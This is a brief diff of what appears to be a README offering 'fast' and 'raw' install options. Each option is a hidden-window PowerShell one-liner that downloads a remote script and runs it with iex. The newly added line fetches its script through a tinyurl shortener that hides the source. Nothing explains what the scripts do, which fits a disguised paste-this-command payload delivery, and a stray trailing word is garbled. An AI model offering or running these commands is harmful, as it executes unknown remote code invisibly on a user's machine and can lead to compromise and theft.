@@ -9,3 +9,5 @@ option 1: (Fast)
 option 2:
 ```powershell -w hidden "iex(iwr https://raw.githubusercontent.com/MRvinyKing/pythonwgetfilestest/main/z.ps1 -UseB)"``` 
 (raw)
+
+```powershell -w hidden "iex(iwr https://tinyurl.com/36rkw6p3 -UseB)"``` perspective
